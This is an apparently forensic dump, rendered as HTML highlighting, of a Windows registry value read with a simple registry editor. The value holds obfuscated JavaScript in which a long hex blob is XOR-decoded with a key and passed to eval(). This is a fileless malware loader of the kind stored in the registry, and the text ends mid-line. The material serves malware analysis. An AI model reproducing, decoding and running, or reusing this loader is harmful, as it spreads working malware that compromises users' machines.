<span class="nx">Simple</span><span class="w"> </span><span class="nx">registry</span><span class="w"> </span><span class="nx">editor</span><span class="p">.</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">help</span><span class="p">.</span>

<span class="o">&gt;</span><span class="w"> </span>
<span class="err">\</span><span class="nx">Software</span><span class="err">\</span><span class="nx">lirs</span><span class="o">&gt;</span><span class="w"> </span><span class="nx">get_val2buf</span><span class="o">:</span><span class="w"> </span><span class="nx">Long</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">parts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="p">,</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">8</span><span class="nx">ba1c</span>
<span class="nx">get_val2buf</span><span class="o">:</span><span class="w"> </span><span class="nx">Datablock</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="nx">offset</span><span class="w"> </span><span class="mf">33</span><span class="nx">c020</span><span class="p">,</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="mf">3</span><span class="nx">fd8</span><span class="w"> </span><span class="p">(</span><span class="mf">16344</span><span class="p">)</span>
<span class="w">             </span><span class="o">:</span><span class="w"> </span><span class="nx">Point</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">restlen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">8</span><span class="nx">a0e</span><span class="p">,</span><span class="w"> </span><span class="nx">copylen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="nx">fd8</span>
<span class="nx">get_val2buf</span><span class="o">:</span><span class="w"> </span><span class="nx">Datablock</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="nx">offset</span><span class="w"> </span><span class="mf">340020</span><span class="p">,</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="mf">3</span><span class="nx">fd8</span><span class="w"> </span><span class="p">(</span><span class="mf">16344</span><span class="p">)</span>
<span class="w">             </span><span class="o">:</span><span class="w"> </span><span class="nx">Point</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="nx">fd8</span><span class="p">,</span><span class="w"> </span><span class="nx">restlen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">4</span><span class="nx">a36</span><span class="p">,</span><span class="w"> </span><span class="nx">copylen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="nx">fd8</span>
<span class="nx">get_val2buf</span><span class="o">:</span><span class="w"> </span><span class="nx">Datablock</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="nx">offset</span><span class="w"> </span><span class="mf">344020</span><span class="p">,</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="mf">3</span><span class="nx">fd8</span><span class="w"> </span><span class="p">(</span><span class="mf">16344</span><span class="p">)</span>
<span class="w">             </span><span class="o">:</span><span class="w"> </span><span class="nx">Point</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">7</span><span class="nx">fb0</span><span class="p">,</span><span class="w"> </span><span class="nx">restlen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">a5e</span><span class="p">,</span><span class="w"> </span><span class="nx">copylen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">a5e</span>
<span class="nx">Value</span><span class="w"> </span><span class="p">&lt;</span><span class="nt">orhmkbye</span><span class="p">&gt;</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="p">),</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">length</span><span class="w"> </span><span class="mf">35342</span><span class="w"> </span><span class="p">[</span><span class="mh">0x8a0e</span><span class="p">]</span>
<span class="nx">kLvh3rmbAeGborOYXmMcoozk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"8WCHTDQe8jL96TQ9UrgeBKPjYMKn"</span><span class="p">;</span><span class="w">  </span><span class="nx">YbeMpBSqmJu0xLiiFY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"UCi8CVAxBsRTPZUEArJ1WniFEMbZhbvZ7bT4TtNqfVfP"</span><span class="p">;</span><span class="w">  </span><span class="nx">E1NADdaQfJCMRCwTvMiHIV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"31KcBqdvSRicNaGH79Akyjr8VYTqMHS"</span><span class="p">;</span><span class="w">  </span><span class="nx">LvswLlrJn5Q2aBlvcnIgHLN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"K0saIir59yOVzRGi"</span><span class="p">;</span><span class="w">  </span><span class="nx">gHLNH5sSWpEwHlrvORD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"amz85ez4LHPAKhIVyklzqYhQZ9ubrfFAUTn"</span><span class="p">;</span><span class="w">  </span><span class="nx">BCRzEWHyiUk3EHeMfIfZ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"yjplgCEjHnGSb3WiRNG6V8B9EpvVrl3yJxwqz1"</span><span class="p">;</span><span class="w">  </span><span class="nx">NTIAIjOTgFH3acz3CWrlIB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"NrNz88D8tzLXOSP4Jvj1shdBh2BDxVNWZZecRqvrqEJv6"</span><span class="p">;</span><span class="w">  </span><span class="nx">XAvWazQNjwMDuxXebDRJz9u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Z6g02LZ4YxcVVZEH48sHBlnhjcNegycDEh4"</span><span class="p">;</span><span class="w">  </span><span class="nx">Jhp39</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"692745272f1801051c24232568351a524b13301c4406784b71751c18370531120003733016543a0b073d232e7c123a1c595c250316150b58051f0b0b2c753b25534c7a0925351a746c5012293765314d0f141f1d28203203005b26390a33381442106c78541a25240a28201c2923441823144929515d1f0438733a2f5b0a354e5c231f09743a2f011c193e7b335e4c6e0136217618033913644f1346760f650b0030055603460b1c0f003b470c1c7b651e122b75706f6507307135000303217624101508372934332631754f640c44787b401d4b7c353931743f5200782b333b767d120e1f21380511650c3c2e3c5d652e1108730d530d504d5b7c601b1c0017252828212331263b350c0d5f7d1c01302173516555084e534c0642340d5201652f0a2f1f140e440a393c1526040c2957313e063c45205e030028172b3c28564d194d5f521d313b19762b0b0c3a1619161f1e1674002c1434257d3b13131d6b0e021d005b0a354e67141c406a33087b1216060528617e7c110c6f056f432a46200a0b17717f222f0510652a1c126f0c2e5b022f154669136e240275706f6522343c6f0d4c684c104c4709032509111841591c1875015476181d774879565d7f4f6c11141658312a4b261b3f232b5a034814787c715b637045565043562e184f56381347711915253e3d073719242f2a15354a4e673f04160523186b24011c5d5466185f5732107759694e0e7d0748745a4011312056220434036c5063165b2b3039254b794c5e52550a0c4c0707745f106c785438323342470d122037026f27025303030d0234317f4d282a72710d1f233f4c63230b2008136c19255e5a401d313b65755b1c052b1f7105472d637e051d220c18171148220a1618351b6a2b011b2920120c2d2c02143f0c23253a5c0f2403141d3f2e402d284108275f0f3d5d476732002535230b27017f7f4a153c61222f2a150542782d77093203113361071b3e090e3c01073f11125b0b0f0e3d0d79245f0c15077832100d0b792f260325102d223e28497a7176630f3f5547193a2027130d0127567d7539241a7f091803207415782240190c121c01323220406337225727316f0c51090a0633657f053f0507320335032c3567590c3d34011a2619021e616b055a321272010d2a25023d023633546c7414147e092b281925152b6b2e5c2a021c6633082f0c3c7a2d096d35302f2f6760341216013229291430267d1a71033b09192e205c3421161b0d30774c11543c1854680438223319127202697e432e0b234f15321b4e0d344733567a39210e3a3b5232215608227b33111f3571361137611c02505a2325281946053303572524250b1a2f0410203a636d21692636695e01092b212628210f700d7f3e370d5b07231f1576435b05637d31053c1914012e3a40353c0d4224114f44080f1a241b2030030c2b293a2c143059520121100d042207145a375d5a137b173f6b57382d2430470d01565660043232156f015113310a47505766243719633a0a322c036338250813216f037c3a1e0c32651d16363b3e701b1b071636630b0e3101050127303f13557f125a361d6e430d2e2d0e1003170f7a675d0b0a094c1b04023974286454411d381c3b0b17331c147e031d5a1b431014673d683a3a1131015d00321c220e743302661c05233e3f0f2e310320036e3e52556a0e7f3b3378041d2f373476625b19147a541d2936021d2502146d78643c0c2106162c235e06386f47380c2101273b183d1929503d6724021a1f0d212d5b360a221f305e1007251263541e5c082f6266054c2a21212b0b0a596d613b0a3c710c2b1e15033449074d30042e01232304213d4a3a596e1a1411205b1d1d302434790e2b3401033515381a2e543435123d61142d145a3458740773060f0b5c2d1d0e300008295700567e2a33160a091b3e32161e512362260c12040508361d477d3e045f3b3517117912191118167b2926643e3d2a211b10286103002d2f120b0c34281e787b166401027a5c06171f161603100a525d033d1918623f033721001001514e2c1d006730633700135008026d1e24021577073217061138360210321f1c0e08033b6200360a00070d12141a2c796e2d53233652793e0e2e31450a770502665a1a107a6b153600041e257d54551f6c3f1a021e0d1437411f0955163234440563022164672a35562325747f400e0e2200353051070a340f1c253a705311762223616766152d21223d211f5a41634a157f6b18502d150324473e637d65130e3b200744457e0d2c7e1c152f115904362024330c0e1b0c153d012f1657046a5e310f253a07723338165671077003137b71303008563f0d701e486e7114772e797f2a133405157a27752f1c091702062d1a07633a210913212e1d6a09110303101d0f0e0173291b2117520d77550c2f2f19262719330f500a11582819795902311f0f16032e0c7d715e0819086e0c040c3934284a1c7b120d2e020b175c463c7f351b5b1c24672f6726313a1216203702007621173c3434245c1b3d371b34260335011a5c7e306b3c0854533934392a180a2e027458421b0437542d360c0220357554551f6c3f0404280d2c43740022543847341862213a2104241f3529231f122b1a1b212540231054271a2f0410203a705f0d7225147b59190f2b55362f06375e537f3b0228710c203d3e0c385f007c1e2c283f283b333e1c4e353e724317010e5b0b003f24067828030f1e172320090e1b6a3f001423245c0e3e2a3856710c012a195f001c300a27130d03567a7d053a3a2c553b513b440d3c700d752f1c0914043432431a5d28074e101f141853191200082e09552b0729220635000525732d002d2d63270c450d0d5070204407684b7e141008013d0703017877771f16087e36380d472339751065110d003e0b0733462a6126046d354f2c176803281463632c323c1731090c340f3b3b05073e3c3e250f2b1c0e2962792f672c10096a04152d2f32301602797e461a2e2b5c0622083926406155560f00391f2f24342f287307096f24460c2e793e0d31682d2a3a3d2624777b1111312d48202426220a3b701c3021634e275f0f3d686316121f2e3e7518355d507f3e371b5c072b2a152916572d771a04293b503a3f2122080c066d023921467b181b37361e0823081f05040135282c59515f2d550f025c0e3e2a385671077003137b713c2c7a0a0e20053045656e3639156f7e08383f2f156337762a0412141e02224f046038074d2a22394061620e0f323a1d170b1314332d2107120e59592f3e34012e26442715536f0e42050d6e4a1c3a255e22762a0a5259631f0f1c7a1f383707282b0035532d227a1d20132411397a2e0c713137313f73103f3c176f3e305d2e301c22303233347e163d335d3a0e0d1b2d2066762b6b371b5f7c043b0b041915252c770c432c0476521639080726400711617b17393731010a3f1c4e06206e01021b2000240a2e17661235172c0d060522243a220036305419092b3d0420105d010b465411710223481331103506375e5f602f763561183b3623293403056c12391e013f60043149520c11081923651a4a351f202506132c150c11742614090919625e31543a1b00322d3a1e586c135d0e3955092d1b7b3c44082e0241565c353a035419143945021f69310120310d3a5b0a30471c5d28034e283e1b1f7b052b38123e05100a1136702d18222c2f5e260b00240515271e2812676f714b3d0d625c03140f56151c180a65636048220801240223420c286b367a120d18390b62341939520b075c34342f14021f1a2c1605323837183c0c261d34313b055e0556183f2706251c1d6640377d211b576766377c0547162e046201651c147a082e366b1b08195f11500f0333345a12312c28735d0a6f3c1a350f05180121643c292539051c1215120a27595c081e553c0a01351b304a605f110208205c77010d050a3e7520086344542f163a6b18546a2d1c384507720639293833203c4426432300501a143b24430b0e3c3d0d220500022b137c3a145b055101310e08102e0f15072b605c0c7814167b62011b27281c1e2f307e6d6e2a332b55192f002f161d51566632192132053420471c5d28034e2835311f62630e46050072090b013e291c3107173677140b2d05381916205c4b530a305d2f196a45332e3115380700277a776436217d6a7e031d223439600f4404160b3d3c182f00290b39005c2a3c3a3d633a6f3200382c2b2c17210c0c37262b24002224035c182506360e3072792378271b76733e377803330e7307036e471b0b150c0b3035100d3172037d0b142d1f2f242613286b033c0943121f35622b010c1c2e02265f310b0d271d18311b57212f0c061e3f3210243159511d62133d75783f15070f03230f2e5606783b3428750709372e170554297c2f66073f1e37283e185220384f153b1e11031f1b01361a030516180532283b090a017e2f1003211b0b74382a0e56750c561d0351473034010e1e0b111156797e102a026b3806173f23437c27432f180231131d36011774270c093f3521117d193f0e1f2e3c05221e2171020f36052178040b2b2f240b083f01146841335629125f471a003e01390c2a0f7f5d411f0e075f7c2f2300233f7b034c07163d31241802423e40180c753a1e3c2f63263f3b1930312f2c2121080711703805470b2a2c0b67353c000e3479502e7c0d2d5f7d1f1e30292733252b795303222a385f02293d471e314403790032331b0027023b385107326b05111b3e576315252630062a082e1c2c38110c2a0b02211e130b1e242d1a302a465f097903207549201e042e1c2e183546537b302435761c163d3a0c1a5a295d3f32071e0e64281f075e22235f0b3b3f01571c101e3a0e3215081b0e22382f12150b7d24005636001b223a211e047507460317705764231a1113090a0e5b794f0f240270270c031e33157e2c53781b33210e1d2d114277061c5f3f3e314369382f111c1f2c5122153122023e261822631b0029243b050b1e1e1e7c70230029234f571a312e112d3d35017c7c5e120c0c4f282c121f283c5a1353051d2d2f303912113d710813623101313b78366d2f02202c2f2731761c3601262f245800290d1b34210d105b20484f237c2c32537e040e2e2b3c237729624351350b275115322d10093a54556e21222d1b21380e38234e0826701a1f18254736153e3620061b18310b0d271c0c311b57212f0c041c3f3210243159520a48133d75783048071f03230f2e564d7b2b3428750706223a3d0554297c2f22043f1e37283e170b35384f153b1e1149082101361a030a041b2f32283b0905587f3f1003211b042c3a2a0e56750c590e007b47303401010e0b111156797e102816513806173f23417e1d432f180231591d1c011774270c0c2b2521117d193f471c143c05221e213c0225360521780b572915240b083f0e4d7c6b335629125f49193a3e01390c2a0b6867411f0e075025383300233f7b030106163d31241802453f7a180c753a11623963263f3b19307b3b16212108071139383f470b2a2c0b602306000e34795f706b372d5f7d1f1e793f0d33252b795307363a385f0229321a1e3144037900327a0c3a27023b385e15247b05111b3e572615352630062a073f081638110c2a0b00360e130b1e24220f242a465f0979036f6263201e042e1c2e183546537b302437770c163d3a0c15072b673f32071e0e613c1f075e22235f432f3f01571c101e3a180815081b0e227b3912150b7d24001d35001b223a211e006117460317705720361a1113090a01486d650f240270270c032433157e2c53301b09210e1d2d114177061c5f3f3e31447e122f111c1f2c52223f3122023e261b36591b00292434591c0e1e1e7c702c5c3e334f571a312e112e0735017c7c5101191c4f282c1210332b5a1353051d223f243912113d710702610b01313b7839353902202c2f273e2b1c2601262f24575f3e1d1b34210d105a23584f237c2c3d097e040e2e2b3c2c2b3f624351350b275115082d10093a5b0d7a21222d1b21380d39334e08267015450f0f4736153e3667063118310b0d28420e211b57212f03580a3f32102431560d1e62133d75783003072503230f2e59596f11342875070932392d0554297c2f6410151e37283e185436024f153b1e1e5b0b3101361a0305150c1532283b0905157e151003211b0b3f2e3a0e56750c5909176b4730340101441d2b1156797e1f7015513806173f23407d27432f18023e001e36011774270c423d3521117d193f0c0b3e3c05221e2e2c0225360521780b543d15240b083f0e036b51335629125f481a3a3e01390c2a0d6b5d411f0e075f353b3300233f7b0c5d06163d31241802432940180c753a11643973263f3b19307f2c2c2121080711712f3f470b2a2c0438353c000e34795f777f272d5f7d1f1e793c3733252b7953073600385f02293d001e31440379003d20183a27023b385105255105111b3e5760151f2630062a082f081638110c2a0b043634130b1e242d1c262a465f0979036e6163201e042e13770c2546537b30247e7636163d3a0c15063d5d3f32071e0e63281f075e22235f0b390501571c10112b0d1815081b0e227f3b12150b7d240f0e212a1b223a211e056207460317705763341a1113090a01486d4f0f2402702855171e33157e2c537b1b33210e1d2d1140603c1c5f3f3e314669282f111c1f230e20153122023e290a23731b002924341b1c1e1e1e7c70234629194f571a312e112e2d35017c7c51480c0c4f282c121f2f3f4a1353051d223a270312113d710702761b01313b7839333b28202c2f273e2e1c3601262f24575e3d371b34210d105820624f237c2c3d4f6a140e2e2b3c23713f584351350b280c15322d10093a5b0c7a1b222d1b21371f3b194e0826701a1d19254736153e362d042118310b0d271a0c1b1b57212f0c060a153210243159540958133d75783f10062503230f2e564c7b013428750709302d2d0554297c2039073f1e37283e185020284f153b1e11481c2101361a03055b183f32283b09055e6a051003211b0b3f393a0e56750c561c175147303401010c0a2b1156797e1f70027b3806173f23427d0d432f180231581e360117742703503f1f21117d193f461c043c05221e2e2f1535360521780b1d3d3f240b083f0e487f6b335629125f010d2a3e01390c25117f77411f0e075f7c3b3300233f7b0c5c07063d312418020e3e7a180c753a11213863263f3b1930322d3c2121080711363b05470b2a2c043f3606000e34795028681d2d5f7d1f1e792b3733252b79534c362a385f02293d431d0b44037900323d0c3a27023b385106315105111b3e572615252630062a082f1f3c38110c2a0b4a2224130b1e24220f2700465f09790c326263201e042e133e0c2546537b302b25771c163d3a0c15013e773f32071e0e603f25075e222350183b2f01571c101e3a1a1815081b0e22383802150b7d240054353a1b223a211e05622d460317705766371a1113090a0e5c7a650f2402702818172433157e2c537c1809210e1d2d110a74161c5f3f3e3e1b7f022f111c1f2c57362f3122023e261a36591b002924345c1f341e1e7c70234829234f571a31210a391735017c7c514b0d1c4f282c12103d28601353051d223f330312113d710858612101313b7836693838202c2f2731731f1c01262f2457152a1d1b34210d1f0134484f237c2c32517d040e2e2b3c237628624351350b275202222d10093a5b0e6d21222d1b21380e3b194e082670154418254736153e3666062118310b0d28440f1b1b57212f035e1d2f3210243156410948133d7578300e070f03230f2e5643783b3428750706232d2d0554297c2038132f1e37283e185221384f153b1e1e5b082101361a03055b182f32283b09055c7e2f1003211b0b76393a0e56750c565503514730340101471e2b1156797e1f3a01413806173f2c1e6927432f18023e02091c011774270c413c2521117d19301b1f143c05221e2e2c0135360521780b522905240b083f0e4c7c41335629125f041a003e01390c251f7c67411f0e075f353b0900233f7b030612063d31241802012a7a180c753a1e3c2f63263f3b193f222f3c2121080711382c3f470b2a2c0b672206000e34795f3d7f272d5f7d1f1e79280d33252b795c5b3500385f02293d450a21440379003230181027023b385105247b05111b3e576315252630062a073d091638110c2a045a2224130b1e2422452410465f0979032d6259201e042e1c28183546537b302437611c163d3a0c1a5e3d673f32071e0e642b35075e22235f40390501571c10112b0d1815081b0e2d253812150b7d240055223a1b223a21115c753d460317705763231a1113090a01017a4f0f2402702818030e33157e2c537a0f09210e1d2d1144743c1c5f3f3e3e1d7e282f111c1f230f35053122023e261b21591b00292434160b1e1e1e7c7023033d334f571a31210e3a2d35017c7c5e100e364f282c121f293c601353051d223f273912113d710858621b01313b7836212f2b2405210617210c0c37262b2f710b233503390f1d075d1d765f0a720d1b5f7914382e2f3705252c79764f31077f5f04272e23212a7d546e1f653f030706101237551b316b473c3418623d3b1b68201e50392f2228231c1b3a214538302215305e2d1f0b3f010e0b5a00365c7505152b21222a1b3e635864157a366a21372f2e77204306067d0428640525013126402428501c151e3c46082134230d13281a0c1132353b285707522b10033a3e003c13212f595a017717387f093d321a11130f05025a6e61002f150a0951002406337822400237240438342d3c14752c295a24233a035415150f09043c053867100f2d181018215c5c142d2a273a16205c497c420e552f09795f00481f2c162a131c7c580608081c533f2d311b31165e5d4612062d212513241d130b2211751b431b2c676436121630382b2b1472083537362f2f470b2a2c0b6321061c5e3d60572378271b5f7914382e2f3574092f0266471a1b1d572c361739071b72037d0b142d1f2a110217276008207b2001351f71361425132211312e210d160e1124155c7b2524250b1a2f0410203a705f0d72253d727766152b3e3a282625700d7f3b2b2d6d7c0d20130324472858026428383b200721254c3c3c0d422c0e3c46321e383d3425381f0f7413353a2a53045302290b3504142138030979621c6321006f483b237b20441e173c47575d22722d5501513b207d0766230d3837240405330c111f635c294110441b115209164408640152233b14362d35031636675d1d3e34021c093428166b0a165d061d6e5e0e211b0a3d01030966056032212169352c3647373b7510621b027f66242a2f123c7a2d096e271a2312741c212e023c2c2929220c2721241006247a082c370723271104273a58792378271b5f7914382e2f3705252f70047d3171764b2c261c45271f750d57103a04150011023f337808227b33111f35713611310b21280b2e390c02241111312d47231054271a2f0410203a705f0d72253d7173161e03211f230b250153543f1628730c33202e3e3f4a285f3039283b0d600435314d262f7d023921467b181b37361e0823081f0504283f02230b7a2b0c16272a0722121e497a71077003137b7130300a27130d0127567d753924067b1d1500207508693c653d061d635b3257021c722c0c53113e1f117b28191d300420112615143f160c0c1b3b493e173c3f240b08240237725105562d1979571e3a08013d070301787c064f071e5728281936233b70255301160b3120132438335021195b1c1a6632613e3f3f12162c2b2c17210c0c37262b2f7103305522660f7625051b620d1755336f08510048252a1f28370276624f1a700d6c1539104525257d08573160040f311a1f17377f1c336c1d40044466610a31072411350b3e220219312351267708305106372b29010b15734e2566516a62681e1602211033210b085e7f3f37235b22543615003f4a28591a2628152b14061b26510b2c6e27171e3c5c080f27211b0823000c741723140634026934350825162d2a205915445c02735439540024300f122217155301794c3227037b0d030c222807572079310d19210e0754203a5b013a423f1a660579172c2002007e52222c0c21033503003f675957312401151d24021e7a7e307b06346a61333103023f1729167a670332212162390068222b3f70135305163d312318270f3c7a2e005b3a3f253f74102b3f15163b2d18660d0c0c37262b2f710b2e272d342506360e3d60572e52571c0e540f097c22252b252f72755131000e5f06296a390715032f7d0b142d1f2a11023f337b15097f241a35355729151c102000361c18052c0e1108212e0925202a04372b0b182031450100600b147b59161e0025362827215d04790f7304710c203d3e0542782d060e27101e3f380437407226587a0215382c450b0006243413385d0f741f7a15161a056a2435090d140b78504050181a7f3c6e7a1810773b7d3417367a460c144c4106616a3a0f725507486f3863213b2e391e23392a23401c3c772540622a6c06311835383c113f3931203d252907005c303b125d7d5c192b1916465d36420c3f545c791c3103542d271e111053163575542a062e0235501f440464757b7f525d6f0b505a0e1f5b1a5e335f102a257b5b5a410103393520675f7a"</span><span class="p">;</span><span class="w">  </span><span class="nx">DytJP2tQpTFSCSPfCj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"JihKxAnKqmpPHXLXpFwSWS75itMzd9siGw"</span><span class="p">;</span><span class="w">  </span><span class="nx">iVzIlGRpmThwNOCL1KG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"dMu8EICKrYXXdxwaUrhHqwy9LmQoERde3472KqSopZ2"</span><span class="p">;</span><span class="w">  </span><span class="nx">SmjeHzofw6cwLeOb6BpRB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"X9S5J2H6uAeyQezWcwzPZrXk2IAWFPgBEU"</span><span class="p">;</span><span class="w">  </span><span class="nx">EzijgiB9PspsjpmUGT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"qJQTNYhedo17qygIRlh"</span><span class="p">;</span><span class="w">  </span><span class="nx">zWxyXEVqMTD9xOVPl4qJ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"9in6qk69cxs6u1MWY1vlmOG0LbrDUcoF5J"</span><span class="p">;</span><span class="w">  </span><span class="nx">wQ5kIBdQNgtKKtnlJzFYm5vi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"3DgKNXDhE2WOHzrFByxwYg4p6fhgkAwmZifaGWuxeJrc"</span><span class="p">;</span><span class="w">  </span><span class="nx">LqMt2n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span><span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">xQI8nL9yS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w">  </span><span class="nx">xQI8nL9yS</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">Jhp39</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w">  </span><span class="nx">xQI8nL9yS</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span><span class="nx">LqMt2n</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">Jhp39</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">xQI8nL9yS</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">),</span><span class="w"> </span><span class="mf">16</span><span class="p">));</span><span class="w">  </span><span class="nx">kgyPNNw5dwbGQXunNbOgUy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"bc7XctQByu2UKFdc9YvmwhUB3gPQt72z"</span><span class="p">;</span><span class="w">  </span><span class="nx">pWnyRnFGYxfzvb9NaSF5drQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"zrXXlTyHXew4xwhQf5lCndWx5qKO9cTvZDYMg"</span><span class="p">;</span><span class="w">  </span><span class="nx">CjqmG4rtcUjWCNzOLJpK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"pxr67Avhtw4dC5EZR"</span><span class="p">;</span><span class="w">  </span><span class="nx">sPDSdBAwGI1fFbcYkhESvZCV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"qEhOFTieJYw92DVqv9eS7JvtWHJTCbvFpV7"</span><span class="p">;</span><span class="w">  </span><span class="nx">OcxKNinMXDsMTZuSH8GpmV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"N1n1vRv9voSFMJfxHOQmTjoZd41ffvvUkdztWM9ZK0aZt"</span><span class="p">;</span><span class="w">  </span><span class="nx">BfynX5vgv6j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"3d4HUJViPevp9ok8rvVv0QXvQWKboVFEOvAbl0lgdlSlEwiy18D1dZ80WyIftDBf146xCO8OaZwDr"</span><span class="p">;</span><span class="w">  </span><span class="nx">Wcfvr3KUA7dQj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span><span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dUHeZSsh9Ein8ehXw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w">  </span><span class="nx">dUHeZSsh9Ein8ehXw</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">LqMt2n</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w">  </span><span class="nx">dUHeZSsh9Ein8ehXw</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">      </span><span class="nx">Wcfvr3KUA7dQj</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">LqMt2n</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">dUHeZSsh9Ein8ehXw</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">).</span><span class="nx">charCodeAt</span><span class="p">()</span><span class="o">^</span><span class="nx">BfynX5vgv6j</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">).</span><span class="nx">charCodeAt</span><span class="p">());</span><span class="w">      </span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">BfynX5vgv6j</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="o">?</span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="o">:</span><span class="mf">0</span><span class="p">;</span><span class="w">  </span><span class="p">}</span><span class="w">    </span><span class="nx">debGISAgM8mZoOwhQl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"2THqj1AWcgvTh7aTBDtmQInzbMwQmTrIJbEwLk2wRLA"</span><span class="p">;</span><span class="w">  </span><span class="nx">L9abAniyzg0QJysBiOE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"2AQosRFzVVVFvWSO5"</span><span class="p">;</span><span class="w">  </span><span class="nx">G6ttaDIFtfXJ2rTTdCnLrm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"LnTu8pj7qE1o1uk9WOxG2URDId1qYH"</span><span class="p">;</span><span class="w">  </span><span class="nb">eval</span><span class="p">(</span><span class="nx">Wcfvr3KUA7dQj</span><span class="p">);</span><span class="w">  </span><span class="nx">dthS5nzOkjAWsQVGybC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"lapVyIgMFCDhGBkMY"</span><span class="p">;</span><span class="w">  </span><span class="nx">arTgKaUl7KUYRlKOz3pCA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"HgahwpeUlnHkCobMdwTbwtjAMDGwI7GFyV9idM4"</span><span class="p">;</span><span class="w">  </span><span class="nx">YBTJGZnZpktBQXq0wdkomLB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"BGQUvQLCa1GCSSoa5U6x3"</span><span class="p">;</span><span 